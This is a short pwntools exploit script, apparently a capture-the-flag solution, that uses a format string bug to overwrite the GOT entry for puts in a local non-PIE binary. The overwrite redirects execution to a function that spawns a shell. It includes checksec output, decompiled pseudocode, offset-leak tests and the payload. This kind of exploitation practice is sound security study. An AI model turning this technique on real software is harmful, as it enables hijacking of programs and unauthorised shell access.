#!/usr/bin/env python3
# Overwriting GOT with format string on a non-PIE binary

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enable
# PIE:      No PIE (0x400000)
      
"""
void main(void)
{
undefined local_98 [32];
char local_78 [104];

...
puts()
read(0,local_98,0x12);
...
read(0,local_78,100);
...
printf("test: %s",local_98);
...
printf(local_78);
...
}

void vuln(void)
{
...
system("/bin/sh");
...
}
"""

# test: AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx
# AAAAAAAA7ffd99632620.0.0.0.7fe4777aa4e0.a.0.0.0.4141414141414141.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25

# test: AAAAAAAA%10$p
# AAAAAAAA0x4141414141414141

from pwn import *

elf = context.binary = ELF('./pwn')

p = process("./pwn")

p.clean()
p.sendline()
p.clean()

payload = fmtstr_payload(10, {elf.got['puts'] : elf.sym['vuln']})

p.sendline(payload)

p.clean()
p.interactive()
